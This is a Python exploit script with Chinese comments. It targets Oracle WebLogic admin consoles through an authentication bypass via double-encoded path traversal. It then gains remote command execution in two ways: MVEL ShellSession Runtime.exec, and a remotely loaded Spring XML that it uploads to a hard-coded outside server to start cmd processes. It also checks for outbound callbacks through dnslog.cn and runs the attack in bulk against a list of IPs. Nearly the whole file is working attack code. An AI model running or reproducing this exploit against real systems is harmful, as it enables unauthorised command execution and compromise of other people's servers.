import requests
import re
import time
def get_cookie(respond_headers):
    pattern='\'Set-Cookie\': \'ADMINCONSOLESESSION=(.*?);'
    cookie_pipei=re.search(pattern,str(respond_headers),flags=0).group(1)
    cookie="\""+cookie_pipei+"\""
    return cookie
    pass
def cun_zai_yz():
    pass
def get_weblogic_version(respond_text):
    partten='<p id="footerVersion">(.*?)</p>'
    version=re.search(partten,respond_text,flags=0).group(1)
    return version

    pass
def weishouquan_panduan(ip):
    # respond=requests.get("http://"+ip+"/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=AppDeploymentsControlPage&handle=com.bea.console.handles.JMXHandle%28%22com.bea%3AName%3Dbase_domain%2CType%3DDomain%22%29")
    # respond_status,respond_headers,respond_text=weishouquan_bao(ip)
    respond=requests.get("http://"+ip+"/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=AppDeploymentsControlPage&handle=com.bea.console.handles.JMXHandle%28%22com.bea%3AName%3Dbase_domain%2CType%3DDomain%22%29")
    respond_status=respond.status_code
    respond_headers=respond.headers
    respond_text=respond.text
    if (respond_status==200):
        # print(ip + "存在未授权访问，可以继续测试")
        try:
            _cookie=get_cookie(respond_headers)
            version=get_weblogic_version(respond_text)
            # print(ip + "存在未授权访问，可以继续测试")
            print(version)
            print("COOKIE已设置为："+_cookie)
            return _cookie,version
        except:
            return '0','0'
    else:
        # print(ip+"不存在未授权访问，无法继续测试")
        return '0','0'
    pass
def url_rce_bao(ip,cookie,bash):    #进行POC1RCE
    burp0_url = "http://"+ip+"/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"java.lang.Runtime.getRuntime().exec('"+bash+"');\")"
    burp0_cookies = {"ADMINCONSOLESESSION": cookie}
    burp0_headers = {"Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
    a=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    return a.headers
def remote_xml_bao(attack_ip,cookie,remote_xml_location): #进行加载远程xml的动作 没有返回值
    burp0_url = "http://"+attack_ip+"/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(%22"+remote_xml_location+"%22)"
    burp0_cookies = {"ADMINCONSOLESESSION": cookie}
    burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
                     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
                     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                     "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
    requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    pass
# def weishouquan_bao(ip):    #访问CVE14882的POC 依据状态码进行判断 函数返回  respond 状态码 报头 返回包内容
#     respond=requests.get("http://"+ip+"/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=AppDeploymentsControlPage&handle=com.bea.console.handles.JMXHandle%28%22com.bea%3AName%3Dbase_domain%2CType%3DDomain%22%29")
#     respond_status=respond.status_code
#     respond_headers=respond.headers
#     respond_text=respond.text
#     return respond_status,respond_headers,respond_text
def dnslog_cookie_get():         #返回DNS log的URL 和COOKIE
    burp0_url = "http://www.dnslog.cn:80/getdomain.php?t=0.08724000470251192"
    burp0_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
        "Accept": "*/*", "Referer": "http://www.dnslog.cn/", "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
    address=requests.get(burp0_url, headers=burp0_headers)
    dns_cookie=re.search('\[<Cookie PHPSESSID=(.*) for',str(address.cookies),flags=0).group(1)
    # print(dns_cookie)
    url=address.text
    print("dns出网验证地址："+url)
    return dns_cookie,url
    pass
def dns_check(dns_cookie):   #代入cookie值检查DNSlog 记录
    time.sleep(2)
    burp0_url = "http://www.dnslog.cn:80/getrecords.php?t=0.8121998929623009"
    burp0_cookies = {"PHPSESSID": dns_cookie}
    burp0_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
        "Accept": "*/*", "Referer": "http://www.dnslog.cn/", "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
    result=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    log=result.text
    print("出网验证信息:\n"+log)
    return log
    pass

def upload_xml_bao(bash):
    burp0_url = "http://118.25.151.131:80/test/shdm/example/example_upload.php"
    burp0_cookies = {"Hm_lvt_70546d661cadce41b9173a040b7f077e": "1607770015",
                     "Hm_lvt_2a49ee9e85a5fb54cf65d27a54cf81b6": "1611577695", "isfirstvisited": "false",
                     "thinkphp_show_page_trace": "0|4", "Hm_lpvt_2a49ee9e85a5fb54cf65d27a54cf81b6": "1611578106",
                     "admin_silicpass": "39e09274ad7f766632ca063f2a8e672e"}
    burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://118.25.151.131",
                     "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryltHKNYJsibylKb6V",
                     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
                     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                     "Referer": "http://118.25.151.131/test/shdm/example/example_upload.php",
                     "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
    burp0_data = "------WebKitFormBoundaryltHKNYJsibylKb6V\r\nContent-Disposition: form-data; name=\"file\"; filename=\"config1.xml\"\r\nContent-Type: text/xml\r\n\r\n\r\n<beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">\r\n  <bean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\">\r\n    <constructor-arg>\r\n      <list>\r\n        <value>cmd</value>\r\n        <value>/c</value>\r\n        <value><![CDATA["+bash+"]]></value>\r\n      </list>\r\n    </constructor-arg>\r\n  </bean>\r\n</beans>\r\n------WebKitFormBoundaryltHKNYJsibylKb6V--\r\n"
    requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)


def rm_xml():
    burp0_url = "http://118.25.151.131:80/test/shdm/example/static/rm.php"
    burp0_cookies = {"Hm_lvt_70546d661cadce41b9173a040b7f077e": "1607770015",
                     "Hm_lvt_2a49ee9e85a5fb54cf65d27a54cf81b6": "1611577695", "isfirstvisited": "false",
                     "thinkphp_show_page_trace": "0|4", "Hm_lpvt_2a49ee9e85a5fb54cf65d27a54cf81b6": "1611578106",
                     "admin_silicpass": "39e09274ad7f766632ca063f2a8e672e"}
    burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
                     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
                     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                     "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
    requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
def url_rce_bao(ip,cookie,bash):
    burp0_url = "http://"+ip+"/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"java.lang.Runtime.getRuntime().exec('"+bash+"');\")"
    burp0_cookies = {"ADMINCONSOLESESSION": cookie}
    burp0_headers = {"Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
    a=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    pass

def remote_xml_bao(attack_ip,cookie,remote_xml_location):
    burp0_url = "http://"+attack_ip+"/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(%22"+remote_xml_location+"%22)"
    burp0_cookies = {"ADMINCONSOLESESSION": cookie}
    burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
                     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
                     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                     "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
    requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    pass
def get_ips_from_file():
    ip_file=open('./ips.txt','r')
    tmp=[]
    ips=[]
    tmp=ip_file.readlines()
    for ip in tmp:
        ip=ip.replace('\n','')
        ips.append(ip)
    return ips

def success_log(ip):
    name_add = time.strftime("%Y%m%d", time.localtime())
    file=open('./success_log'+name_add+'.txt','a+')
    file.write(ip+'\n')
    file.close()
